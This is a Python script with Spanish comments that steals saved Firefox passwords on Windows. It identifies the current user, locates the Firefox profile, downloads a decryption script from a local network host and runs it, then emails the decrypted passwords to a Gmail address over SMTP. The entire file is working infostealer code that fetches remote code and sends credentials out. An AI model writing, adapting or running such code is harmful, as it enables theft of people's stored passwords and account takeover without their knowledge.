#!/usr/bin/env python3
# coding: cp850

import subprocess  # Permite ejecutar comandos del sistema operativo
import requests  # Utilizado para realizar solicitudes HTTP y descargar archivos
import smtplib  # Para el envío de correos electrónicos
from email.mime.text import MIMEText  # Para formatear el texto del correo electrónico
from termcolor import colored  # Para imprimir mensajes de salida en color
import tempfile  # Para crear y trabajar con directorios temporales
import os  # Para interactuar con el sistema de archivos
import sys  # Para interactuar con el sistema operativo

# Función para enviar correos electrónicos
def send_email(subject, body, sender, recipients, password):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = ', '.join(recipients)

    # Conexión segura al servidor SMTP de Gmail para el envío del correo
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
        smtp_server.login(sender, password)
        smtp_server.sendmail(sender, recipients, msg.as_string())
    print(colored(f"\n[+] Email sent Successfully!!", "green"))

# Función para ejecutar comandos en el sistema y obtener la salida
def run_command(command):
    try:
        output_command = subprocess.check_output(command, shell=True)
        return output_command.decode("cp850").strip() if output_command else None
    except Exception as e:
        print(f"\n[!] Error al ejecutar el comando {command}. Err: {e}")
        return None

# Función para obtener el perfil de usuario de Firefox
def get_firefox_profiles(username):
    path = f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
    try:
        profiles = [profile for profile in os.listdir(path) if "release" in profile]
        return profiles[0] if profiles else None
    except Exception as e:
        print(f"\n[!] No ha sido posible obtener los perfiles de Firefox\n")
        return None

# Función para decodificar y recuperar contraseñas almacenadas en Firefox
def get_firefox_passwords(username, profile):
    r = requests.get("http://192.168.1.80/firefox_decrypt.py")  # Descarga script de decodificación
    temp_dir = tempfile.mkdtemp()  # Crea un directorio temporal
    os.chdir(temp_dir)  # Cambia al directorio temporal

    # Guarda el script descargado y lo ejecuta para decodificar las contraseñas
    with open("firefox_decrypt.py", "wb") as f:
        f.write(r.content)
    command = f"python firefox_decrypt.py C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{profile}"
    passwords = run_command(command)

    os.remove("firefox_decrypt.py")  # Elimina el script de decodificación

    return passwords

# Punto de entrada principal del script
if __name__ == '__main__':
    username_str = run_command("whoami")  # Obtiene el nombre de usuario actual
    username = username_str.split("\\")[1]
    profiles = get_firefox_profiles(username)  # Obtiene el perfil de Firefox
    
    # Verifica si se pudo obtener el perfil de usuario
    if not username or not profiles:
        sys.exit(f"\n[!] No ha sido posible obtener el nombre de usuario o perfiles válidos para Firefox")

    passwords = get_firefox_passwords(username, profiles)  # Recupera contraseñas

    # Envía las contraseñas recuperadas por correo electrónico si se encontraron
    if passwords:
        send_email("Decrypted Firefox Passwords", passwords, "elquenviaelmensaje@gmail.com", ["Elquerecibeelmensaje@gmail.com"], "Contraseña de la API")
    else:
        print(f"\n[!] No se han encontrado contraseñas\n")
